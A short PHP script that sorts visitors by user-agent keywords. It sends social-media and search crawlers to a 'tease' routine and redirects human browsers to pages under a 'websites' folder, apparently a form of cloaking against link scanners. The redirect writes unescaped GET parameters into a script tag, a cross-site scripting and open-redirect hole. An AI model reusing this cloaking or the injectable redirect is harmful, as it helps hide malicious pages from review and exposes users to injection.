<?php 

function detect() 
{
    //$b means list of bots user agents, Mostly these words came in bots user agent, So we don't allow them.
    $b = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");

    //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
    $h =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");

    if (!empty($_SERVER['HTTP_USER_AGENT']))
    {
	//$u will get user agent
        $u = strtolower($_SERVER['HTTP_USER_AGENT']);
        
        foreach ($b as $bv)
        {
            if (substr_count($u , $bv) > 0) 
            {
                echo "<script>console.log('You are detected as bot at=".$bv."');</script>";
                return false;
            }
        }

        foreach ($h as $hv)
        {
             if (substr_count($u,$hv) > 0) 
            {
                echo "<script>console.log('You are detected as human at=".$hv."');</script>";
                return True;
            }
        }
	    
    } 
    else 
    { 
	    return False; 
    }
	
}
if(detect() == true)
{
	if(isset($_GET['redirect']))
	{
		echo "<script>window.location.replace('.././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : "") ."');</script>";
	}
}
else
{
	//Let's teach bot a lesson
    include("tease.php"); 
    tease();
}
?>
